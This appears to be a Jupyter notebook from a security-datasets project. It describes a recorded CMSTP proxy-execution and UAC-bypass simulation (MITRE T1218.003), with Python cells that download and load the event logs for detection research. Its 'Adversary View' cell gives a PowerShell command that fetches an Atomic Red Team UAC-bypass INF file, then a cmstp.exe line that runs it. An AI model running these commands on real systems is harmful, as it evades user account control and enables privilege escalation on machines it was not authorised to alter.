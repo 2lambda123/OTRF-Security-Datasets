{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3922cd86",
   "metadata": {},
   "source": [
    "# CMSTP Proxy Execution"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "120b24db",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3a4122e6",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/10/22 |\n",
    "| Modification Date | 2020/10/22 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1218.003](https://attack.mitre.org/techniques/T1218/003) |\n",
    "| Tags              | art.748cb4f6-2fb3-4e97-b7ad-b22635a09ab0 |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ba0a72a3",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents threat actors leveraging CMSTP to execute an Inf file to proxy execute other malicious commands (i.e. cmd.exe). (Embedding commands in the RunPreSetupCommandsSection of the INF file)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9014293f",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "42ca62ba",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_cmstp_execution_bypassuac.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_cmstp_execution_bypassuac.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a938207f",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d2053baf",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2706a1b9",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | powershell | [powershell](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md#atomic-test-2---cmstp-executing-uac-bypass) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "08b02b2d",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf\" -OutFile C:\\ProgramData\\T1218.003_uacbypass.inf\n",
    "cmstp.exe /s C:\\ProgramData\\T1218.003_uacbypass.inf /au\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5a8b58ae",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "95c8aee4",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3482d2ae",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_cmstp_execution_bypassuac.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f62fcdce",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "92de9ef9",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0bfe9e0c",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9d0f3a2b",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8f8a95d9",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md#atomic-test-2---cmstp-executing-uac-bypass](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md#atomic-test-2---cmstp-executing-uac-bypass) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
